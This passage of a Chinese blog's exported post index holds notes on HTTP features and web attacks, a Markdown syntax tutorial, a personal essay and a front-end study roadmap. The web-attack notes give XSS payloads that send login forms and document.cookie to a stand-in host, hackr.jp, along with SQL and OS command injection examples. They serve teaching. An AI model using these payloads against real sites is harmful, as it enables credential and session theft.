title="HTTP认证："></a>HTTP认证：</h3><ul><li>Basic认证：采用Base64编码，发送明文密码</li><li>Digest认证：使用质询/响应方式</li><li>SSL客户端认证：借由HTTPS的客户端证书完成认证</li><li>基于表单认证：最常用，并用Cookie来管理Session会话</li></ul><h2 id="基于HTTP的功能追加协议"><a href="#基于HTTP的功能追加协议" class="headerlink" title="基于HTTP的功能追加协议"></a>基于HTTP的功能追加协议</h2><h3 id="SPDY"><a href="#SPDY" class="headerlink" title="SPDY"></a>SPDY</h3><h4 id="HTTP的瓶颈："><a href="#HTTP的瓶颈：" class="headerlink" title="HTTP的瓶颈："></a>HTTP的瓶颈：</h4><ul><li>一条连接上只可发送一个请求</li><li>请求只能从客户端开始，客户端不可以接收响应以外的指令</li><li>请求/响应首部未经压缩就发送，首部信息越多延迟越大</li><li>发送冗长的首部，每次互相发送相同的首部造成的浪费较多</li><li>可任意选择数据压缩格式，非强制压缩发送</li></ul><h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><ul><li>Ajax：异步请求实现局部刷新，但可能存在大量请求产生</li><li>Comet：一旦服务器内容更新了，可以立即反馈给客户端</li><li>SPDY：<blockquote><p>以会话层的形式加入，控制对数据的流动，但还是采用HTTP建立通信连接<br><code>HTTP</code> 应用层<br><code>SPDY</code> 会话层<br><code>SSL</code> 表示层<br><code>TCP</code> 传输层<br>多路复用流：通过单一的TCP连接，可以无限制处理多个HTTP请求<br>赋予请求优先级：可以给请求逐个分配优先级顺序<br>压缩HTTP首部：压缩HTTP请求和响应的首部<br>推送功能：支持服务器主动向客户端推送数据的功能<br>服务器提示功能：服务器可以主动提示客户端请求所需的资料</p></blockquote></li></ul><h3 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义:"></a>定义:</h4><ul><li>即Web浏览器与Web浏览器服务器之间全双工通信标准</li></ul><h4 id="特点"><a href="#特点" class="headerlink" title="特点:"></a>特点:</h4><ul><li>推送功能：支持由服务器向客户端推送数据的推送功能</li><li>减少通行量：只要建立起WebSocket连接，就希望一直保持连接状态</li></ul><h4 id="WebSocketAPI"><a href="#WebSocketAPI" class="headerlink" title="WebSocketAPI:"></a>WebSocketAPI:</h4><ul><li>JavaScript可调用API，实现WebSocket协议下全双工通信</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var socket = new WebSocket(&apos;ws://game.example.com:12010/updates&apos;);</span><br><span class="line">socket.onopen = function()&#123;</span><br><span class="line">    setInternal(function()&#123;</span><br><span class="line">        if(socket.bufferedAmout == 0)&#123;</span><br><span class="line">            socket.send(getUpdateData());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,50);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="WebDAV"><a href="#WebDAV" class="headerlink" title="WebDAV"></a>WebDAV</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义:"></a>定义:</h4><ul><li>WebDAV是一个可对Web服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统</li></ul><h4 id="引入概念"><a href="#引入概念" class="headerlink" title="引入概念:"></a>引入概念:</h4><ul><li>集合(Collection)：是一种统一管理多个资源的概念，以集合为单位可进行各种操作</li><li>资源(Resource)：把文件或集合称为资源</li><li>属性(Property)：定义资源的属性</li><li>锁(Lock)：把文件设置成无法编辑状态</li></ul><h4 id="新增方法及状态码"><a href="#新增方法及状态码" class="headerlink" title="新增方法及状态码:"></a>新增方法及状态码:</h4><ul><li>PROPFIND：获取属性</li><li>PROPPATCH：修改属性</li><li>MKCOL：创建集合</li><li>COPY：复制资源及属性</li><li>MOVE：移动资源</li><li>LOCK：资源加锁</li><li>UNLOCK：资源解锁</li></ul><table><thead><tr><th style="text-align:left">状态码</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">102 Processing</td><td style="text-align:left">可正常处理请求，但目前是处理中状态</td></tr><tr><td style="text-align:left">207 Multi-Status</td><td style="text-align:left">存在多种状态</td></tr><tr><td style="text-align:left">422 Unprocessible Entity</td><td style="text-align:left">格式正确，内容有误</td></tr><tr><td style="text-align:left">423 Locked</td><td style="text-align:left">资源已被加锁</td></tr><tr><td style="text-align:left">424 Failed Dependency</td><td style="text-align:left">处理与某请求关联的请求失败，因此不再维持依赖关系</td></tr><tr><td style="text-align:left">507 Insufficient Storage</td><td style="text-align:left">保存空间不足</td></tr></tbody></table><h2 id="Web的攻击技术"><a href="#Web的攻击技术" class="headerlink" title="Web的攻击技术"></a>Web的攻击技术</h2><h3 id="跨站脚本攻击-XSS"><a href="#跨站脚本攻击-XSS" class="headerlink" title="跨站脚本攻击(XSS)"></a>跨站脚本攻击(XSS)</h3><h4 id="定义-2"><a href="#定义-2" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指通过存在安全漏洞的Web网站注册用户的浏览器内运行非法的HTML标签或JavaScript进行的一种攻击</li></ul><h4 id="造成影响"><a href="#造成影响" class="headerlink" title="造成影响:"></a>造成影响:</h4><ul><li>利用虚假输入表单骗取用户个人信息</li><li>利用脚本窃取用户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求</li><li>显示伪造的文章或图片</li></ul><h4 id="攻击案例"><a href="#攻击案例" class="headerlink" title="攻击案例:"></a>攻击案例:</h4><ul><li>获取用户登录信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/Login?ID=&quot;&gt;&lt;script&gt;var tf=document.getElemenById(&apos;login&apos;);tf.action=&apos;http://hackr.jp/pwget&apos;;tf.method=&apos;get&apos;;&lt;/script&gt;&lt;span ts=&quot;</span><br></pre></td></tr></table></figure><ul><li>对用户Cookie的窃取攻击</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.jp/login?ID=&quot;&gt;&lt;script src=http://hackr.jp/xss.js&gt;&lt;/script&gt;&quot;</span><br><span class="line">xss.js文件：</span><br><span class="line">var content = escape(document.cookie);</span><br><span class="line">document.write(&quot;&lt;img src=http://hackr.jp/?&quot;);</span><br><span class="line">document.write(content);</span><br><span class="line">document.write(&quot;&gt;&quot;);</span><br></pre></td></tr></table></figure><h3 id="SQL攻击"><a href="#SQL攻击" class="headerlink" title="SQL攻击"></a>SQL攻击</h3><h4 id="定义-3"><a href="#定义-3" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指针对Web应用使用的数据库通过运行非法的SQL而产生的攻击</li></ul><h4 id="造成影响-1"><a href="#造成影响-1" class="headerlink" title="造成影响:"></a>造成影响:</h4><ul><li>非法查看或篡改数据库内的数据</li><li>规避认证</li><li>执行和数据库服务器业务关联的程序等</li></ul><h4 id="攻击案例-1"><a href="#攻击案例-1" class="headerlink" title="攻击案例:"></a>攻击案例:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/search?q=marry&apos;--</span><br><span class="line">select * from bookTbl where author=&quot;marry&quot; --&apos; and flag=1;</span><br></pre></td></tr></table></figure><h3 id="OS命令注入攻击"><a href="#OS命令注入攻击" class="headerlink" title="OS命令注入攻击"></a>OS命令注入攻击</h3><h4 id="定义-4"><a href="#定义-4" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指通过Web应用，执行非法的操作系统命令达到攻击的目的</li></ul><h4 id="攻击案例-2"><a href="#攻击案例-2" class="headerlink" title="攻击案例:"></a>攻击案例:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">my $adr = $q -&gt; param(&apos;mailaddress&apos;);</span><br><span class="line">open(MAIL,&quot;|/user/sbin/senmail  $adr&quot;);</span><br><span class="line">print MAIL &quot;Form:info@example.com\n&quot;;</span><br></pre></td></tr></table></figure><h3 id="HTTP首部注入攻击"><a href="#HTTP首部注入攻击" class="headerlink" title="HTTP首部注入攻击"></a>HTTP首部注入攻击</h3><h4 id="定义-5"><a href="#定义-5" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指攻击者通过在响应首部字段内插入换行，添加任意响应首部或主体的一种攻击</li></ul><h3 id="邮件首部注入攻击"><a href="#邮件首部注入攻击" class="headerlink" title="邮件首部注入攻击"></a>邮件首部注入攻击</h3><h4 id="定义-6"><a href="#定义-6" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指Web应用中的邮件发送功能，攻击者通过向邮件首部To或Subject内任意添加非法内容发起的攻击</li></ul><h3 id="目标遍历攻击"><a href="#目标遍历攻击" class="headerlink" title="目标遍历攻击"></a>目标遍历攻击</h3><h4 id="定义-7"><a href="#定义-7" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是指对本无意公开的文件目录，通过非法截断其目录路径后，达成访问目的的一种攻击</li></ul><h3 id="跨站点请求伪造-CSRF"><a href="#跨站点请求伪造-CSRF" class="headerlink" title="跨站点请求伪造(CSRF)"></a>跨站点请求伪造(CSRF)</h3><h4 id="定义-8"><a href="#定义-8" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新</li></ul><h3 id="点击劫持"><a href="#点击劫持" class="headerlink" title="点击劫持"></a>点击劫持</h3><h4 id="定义-9"><a href="#定义-9" class="headerlink" title="定义:"></a>定义:</h4><ul><li>指利用透明的按钮或链接做成陷阱覆盖在Web页面之上</li></ul><h3 id="DoS攻击"><a href="#DoS攻击" class="headerlink" title="DoS攻击"></a>DoS攻击</h3><h4 id="定义-10"><a href="#定义-10" class="headerlink" title="定义:"></a>定义:</h4><ul><li>是一种让运行中的服务呈停止状态的攻击</li></ul>]]></content>
      
      
      <categories>
          
          <category> HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown常用语法</title>
      <link href="/Markdown%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95.html"/>
      <url>/Markdown%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95.html</url>
      
        <content type="html"><![CDATA[<h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>在Markdown中，标题一共分为六级，只需在文字前加上 <code>#</code> 即可，这类标题也可以选择闭合，闭合只是为了美观，由行首的井字符数量决定标题的阶数。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># h1</span><br><span class="line">## h2</span><br><span class="line">### h3</span><br><span class="line">#### h4</span><br><span class="line">##### h5</span><br><span class="line">###### h6</span><br></pre></td></tr></table></figure><h2 id="分级标题"><a href="#分级标题" class="headerlink" title="分级标题"></a>分级标题</h2><p>与标题作用类似，<code>=</code> 和 <code>-</code> 最少可只写一个，兼容性一般。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">一级标题</span><br><span class="line">============</span><br><span class="line">二级标题</span><br><span class="line">------------</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><p>根据标题生成目录，兼容性一般，nexT主题已经开启自动生成目录。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[TOC]</span><br></pre></td></tr></table></figure><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><p>引用可以分为单行引用和多行引用（引用块），同时只要根据层次加上 <code>&gt;</code> 就可以实现嵌套引用，引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等。代码：</p><h3 id="单行式"><a href="#单行式" class="headerlink" title="单行式"></a>单行式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br></pre></td></tr></table></figure><p>效果：</p><blockquote><p>hello world!</p></blockquote><h3 id="多行式"><a href="#多行式" class="headerlink" title="多行式"></a>多行式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">brand new world!</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">&gt; brand new world!</span><br></pre></td></tr></table></figure><p>效果相同：</p><blockquote><p>hello world!<br>brand new world!</p></blockquote><h3 id="嵌套式"><a href="#嵌套式" class="headerlink" title="嵌套式"></a>嵌套式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; hello world!</span><br><span class="line">&gt;&gt; brand new world!</span><br></pre></td></tr></table></figure><p>效果：</p><blockquote><p>hello world!</p><blockquote><p>brand new world!</p></blockquote></blockquote><h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><p>代码块可分为行内代码块和多行代码块。代码：</p><h3 id="行内代码"><a href="#行内代码" class="headerlink" title="行内代码"></a>行内代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;div&gt;&lt;/div&gt;`</span><br></pre></td></tr></table></figure><p>效果：<br><code>&lt;div&gt;&lt;/div&gt;</code></p><h3 id="代码块-1"><a href="#代码块-1" class="headerlink" title="代码块"></a>代码块</h3><p>用三个反引号包裹一串代码，或者使用Tab缩进。注意要空开一行书写。<br>效果：</p><pre><code>&lt;div&gt;       &lt;div&gt;&lt;/div&gt;    &lt;div&gt;&lt;/div&gt;    &lt;div&gt;&lt;/div&gt;&lt;/div&gt;</code></pre><h3 id="自定义语法"><a href="#自定义语法" class="headerlink" title="自定义语法"></a>自定义语法</h3><p>该方法可以根据不同的语言配置不同的代码着色。(代码在使用的时候去掉前面的反斜杠，这里为了防止被编译而加上)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">\```javascript</span><br><span class="line">var num = 0;</span><br><span class="line">for (var i = 0; i &lt; 5; i++) &#123;</span><br><span class="line">    num+=i;</span><br><span class="line">&#125;</span><br><span class="line">\```console.log(num);</span><br></pre></td></tr></table></figure><p>效果：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    num+=i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(num);</span><br></pre></td></tr></table></figure><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>Markdown中支持两种列表：无序列表和有序列表。</p><h3 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h3><p>无序列表有三种语法,可使用 <code>*</code> 、<code>+</code> 、 <code>-</code>作为列表标记。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*   Red</span><br><span class="line">*   Green</span><br><span class="line">*   Blue</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">+   Red</span><br><span class="line">+   Green</span><br><span class="line">+   Blue</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-   Red</span><br><span class="line">-   Green</span><br><span class="line">-   Blue</span><br></pre></td></tr></table></figure><p>效果：</p><ul><li>Red</li><li>Green</li><li>Blue</li></ul><h3 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h3><p>在列表标记上使用的数字并不会影响输出的 HTML 结果，即可以让 Markdown 文件的列表数字和输出的结果相同，也可以完全不用在意数字的正确性。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.  Bird</span><br><span class="line">2.  McHale</span><br><span class="line">3.  Parish</span><br></pre></td></tr></table></figure><p>效果：</p><ol><li>Bird</li><li>McHale</li><li>Parish</li></ol><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><p>可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* * *</span><br><span class="line"></span><br><span class="line">***</span><br><span class="line"></span><br><span class="line">*****</span><br><span class="line"></span><br><span class="line">- - -</span><br><span class="line"></span><br><span class="line">---------------------------------------</span><br></pre></td></tr></table></figure><p>效果：</p><hr><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>Markdown 支持两种形式的链接语法： 行内式和参考式两种形式。不管是哪一种，链接文字都是用 [方括号] 来标记。</p><h3 id="行内式"><a href="#行内式" class="headerlink" title="行内式"></a>行内式</h3><p>要建立一个行内式的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[an example](http://example.com/&quot;Title&quot;)&#123;:</span><br></pre></td></tr></table></figure><p>效果：<br><a href="http://example.com/&quot;Title&quot;" target="_blank" rel="noopener">an example</a></p><h3 id="参考式"><a href="#参考式" class="headerlink" title="参考式"></a>参考式</h3><p>该链接必须带 <code>http://</code> ，否则会被解析成本地路径，代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[an example][id]</span><br><span class="line">[id]: http://example.com/</span><br></pre></td></tr></table></figure><p>效果：<br><a href="http://example.com/" target="_blank" rel="noopener">an example</a></p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>Markdown 使用一种和链接很相似的语法来标记图片，和链接的主要区别在于在最开头需要标记 <code>!</code> 。同样分为行内式和参考式。</p><h3 id="行内式-1"><a href="#行内式-1" class="headerlink" title="行内式"></a>行内式</h3><p>方括号中用来放图片无法正常显示时的替代文字，代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![Alt text](../assets/blogImg/avatar.png)</span><br></pre></td></tr></table></figure><h3 id="参考式-1"><a href="#参考式-1" class="headerlink" title="参考式"></a>参考式</h3><p>代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![Alt text][01]</span><br><span class="line">[01]: ../assets/blogImg/avatar.png</span><br></pre></td></tr></table></figure><p>效果：<br><img src="../assets/blogImg/2018-3-31.jpg" alt="Alt text"></p><h2 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h2><p>注意要空开一行书写。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- [x] 选项一</span><br><span class="line">- [ ] 选项二  </span><br><span class="line">- [ ]  [选项3]</span><br></pre></td></tr></table></figure><p>效果：</p><ul><li style="list-style: none"><input type="checkbox" checked> 选项一</li><li style="list-style: none"><input type="checkbox"> 选项二  </li><li style="list-style: none"><input type="checkbox"> 选项三</li></ul><h2 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h2><p><code>:</code> 代表对齐方式 , <code>:</code> 与 <code>|</code> 之间不要有空格，否则对齐会有些不兼容。代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|    a    |       b       |      c     |</span><br><span class="line">|:-------:|:------------- | ----------:|</span><br><span class="line">|   居中  |     左对齐    |   右对齐   |</span><br><span class="line">|=========|===============|============|</span><br></pre></td></tr></table></figure><p>效果：</p><table><thead><tr><th style="text-align:center">a</th><th style="text-align:left">b</th><th style="text-align:right">c</th></tr></thead><tbody><tr><td style="text-align:center">居中</td><td style="text-align:left">左对齐</td><td style="text-align:right">右对齐</td></tr><tr><td style="text-align:center">=========</td><td style="text-align:left">===============</td><td style="text-align:right">============</td></tr></tbody></table><p>简约写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a | b | c  </span><br><span class="line">:-:|:- |-:</span><br><span class="line">    居中    |     左对齐      |   右对齐    </span><br><span class="line">============|=================|=============</span><br></pre></td></tr></table></figure><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><table><thead><tr><th style="text-align:center">描述</th><th style="text-align:center">效果</th><th style="text-align:center">代码</th></tr></thead><tbody><tr><td style="text-align:center">斜体</td><td style="text-align:center"><em>斜体</em></td><td style="text-align:center"><code>*斜体*</code></td></tr><tr><td style="text-align:center">斜体</td><td style="text-align:center"><em>斜体</em></td><td style="text-align:center"><code>_斜体_</code></td></tr><tr><td style="text-align:center">加粗</td><td style="text-align:center"><strong>加粗</strong></td><td style="text-align:center"><code>**加粗**</code></td></tr><tr><td style="text-align:center">加粗+斜体</td><td style="text-align:center"><strong><em>加粗+斜体</em></strong></td><td style="text-align:center"><code>***加粗+斜体***</code></td></tr><tr><td style="text-align:center">加粗+斜体</td><td style="text-align:center"><strong><em>加粗+斜体</em></strong></td><td style="text-align:center"><code>**_加粗+斜体_**</code></td></tr><tr><td style="text-align:center">删除线</td><td style="text-align:center"><del>删除线</del></td><td style="text-align:center"><code>~~删除线~~</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 语法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>人生这本书翻开新的一章</title>
      <link href="/%E4%BA%BA%E7%94%9F%E8%BF%99%E6%9C%AC%E4%B9%A6%E7%BF%BB%E5%BC%80%E6%96%B0%E7%9A%84%E4%B8%80%E7%AB%A0.html"/>
      <url>/%E4%BA%BA%E7%94%9F%E8%BF%99%E6%9C%AC%E4%B9%A6%E7%BF%BB%E5%BC%80%E6%96%B0%E7%9A%84%E4%B8%80%E7%AB%A0.html</url>
      
        <content type="html"><![CDATA[<p><img src="./assets/blogImg/2018-3-30.jpg" alt><br><a id="more"></a><br>3月的尾巴，距离大学毕业还剩2个月左右的时间，昨晚和室友卧谈，聊起了在这个时间点，每个站在人生岔路口迷茫的我们。<br>最近考研、考公的都出了结果，漫长的备考过程，本期望着盼来好消息的两个室友却不得不面对与自己第一志愿失之交臂，在调剂亦或是就业中做出选择，当其他得到录取通知的同学开始整日整日放纵欢腾的时候，她们脸上是淡淡的笑，眼里却也有着对未来的迷茫。在和我一起逛过几次招聘会后，昨天其中一个室友说，她决定调剂，去一个离我们很远的地方继续她的学习生涯，说这话时，我能感觉到她隐隐的无奈，但也只能淡淡祝她好运，话题的最后，我仿佛听到自己内心一个声音问道：“这就是你当初不选择考研而是直接工作的原因吗？”<br>不是。去年的这个时候，当我做出这个决定周围经常会有人问“你成绩那么好，大学那么努力，为什么不考虑考研深造呢”，我不考研并不是因为我害怕最后会失败，而是我清楚的知道自己想要什么，即使学生时代那么让人留恋，但明确知道自己想做一名优秀程序媛的我，需要更多的是实践动手能力，在公司中不断参与项目的开发能更快提升我的能力，虽然一个更高的学历可能会为我在就业上扫除很多障碍，就不会像现在的我这样有些无助。不愿离开学生时代，倒不如说是不愿离开象牙塔。但是不管是哪一个选择都已经是过去式，与其缅怀过去不如立足当下。<br>现在的不顺利，是之前的准备不充分，机会是给有准备的人的这句话，不是失败者拿来自我安慰，所幸学习这件事，不管何时开始都不算晚，为了让自己更优秀，让自己成为HR眼中合适的人，让自己离自己的目标越来越接近，就从这篇博文开始，找回那个热血的自己。嘴上立志轻松容易，但学习却是持之以恒，愿自己初心莫负。</p><p>——<em>2018年3月30日于杭州师范大学</em></p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
            <tag> 心情 </tag>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习路线</title>
      <link href="/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF.html"/>
      <url>/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF.html</url>
      
        <content type="html"><![CDATA[<h2 id="第一阶段："><a href="#第一阶段：" class="headerlink" title="第一阶段："></a>第一阶段：</h2><ul><li>HTML+CSS：<br>HTML进阶、CSS进阶、div+css布局、HTML+css整站开发。</li><li>JavaScript基础：<br>Js基础教程、js内置对象常用方法、常见DOM树操作大全、ECMAscript、DOM、BOM、定时器和焦点图。</li><li>JS基本特效：<br>常见特效、例如：tab、导航、整页滚动、轮播图、JS制作幻灯片、弹出层、手风琴菜单、瀑布流布局、滚动事件、滚差视图。<a id="more"></a></li><li>JS高级特征：<br>正则表达式、排序算法、递归算法、闭包、函数节流、作用域链、基于距离运动框架、面向对象基础。</li><li>JQuery：<br>悬着器、DOM操作、特效和动画、方法链、拖拽、变形、JQueryUI组件基本使用。</li></ul><h2 id="第二阶段：HTML5和移动Web开发"><a href="#第二阶段：HTML5和移动Web开发" class="headerlink" title="第二阶段：HTML5和移动Web开发"></a>第二阶段：HTML5和移动Web开发</h2><ul><li>HTML5：<br>HTML5新语义标签、HTML5表单、音频和视频、离线和本地存储、SVG、Web Socket、Canvas。</li><li>CSS3：<br>CSS3新选择器、伪元素、脸色表示法、边框、阴影、background系列属性改变、Transition、动画、景深和深透、3D效果制作、Velocity.js框架、元素进场、出场策略、炫酷CSS3网页制作。</li><li>Bootstrap:<br>响应式概念、媒体查询、响应式网站制作、删格系统、删格系统原理、Bootstrap常用模板、LESS和SASS。</li><li>移动Web开发：<br>跨终端WEB和主流设备简介、视口、流式布局、弹性盒子、rem、移动终端JavaScript事件、手机中常见JS效果制作、Zepto.js、手机聚划算页面、手机滚屏。</li></ul><h2 id="第三阶段：HTTP服务和AJAX编程"><a href="#第三阶段：HTTP服务和AJAX编程" class="headerlink" title="第三阶段：HTTP服务和AJAX编程"></a>第三阶段：HTTP服务和AJAX编程</h2><ul><li>WEB服务器基础：<br>服务器基础知识、Apache服务器和其他WEB服务器介绍、Apache服务器搭建、HTTP介绍。</li><li>PHP基础：<br>PHP基础语法、使用PHP处理简单的GET或者POST请求。</li><li>AJAX上篇：<br>Ajax简介和异步的概念、Ajax框架的封装、XMLHttpRequest对象详细介绍方法、兼容性处理方法、Ajax框架的封装、Ajax中缓存问题、XML介绍和使用。</li><li>AJAX下篇：<br>JSON和JSON解析、数据绑定和模板技术、JSONP、跨域技术、图片预读取和lazy-load技术、JQuery框架中的AjaxAPI、使用Ajax实现爆布流案例额。</li></ul><h2 id="第四阶段：HTTP服务和AJAX编程"><a href="#第四阶段：HTTP服务和AJAX编程" class="headerlink" title="第四阶段：HTTP服务和AJAX编程"></a>第四阶段：HTTP服务和AJAX编程</h2><ul><li>面向对象终极篇：<br>从内存角度到理解JS面向对象、基本类型、复杂类型、原型链、ES6中的面向对象、属性读写权限、设置器、访问器。</li><li>面向对象三大特征：<br>继承性、多态性、封装性、接口。</li><li>设计模式：<br>面向对象编程思维、单例模式、工厂模式、策略模式、观察者模式、模板方法模式、代理模式、装饰者模式、适配器模式、面向切面编程。</li></ul><h2 id="第五阶段：封装一个属于自己的框架"><a href="#第五阶段：封装一个属于自己的框架" class="headerlink" 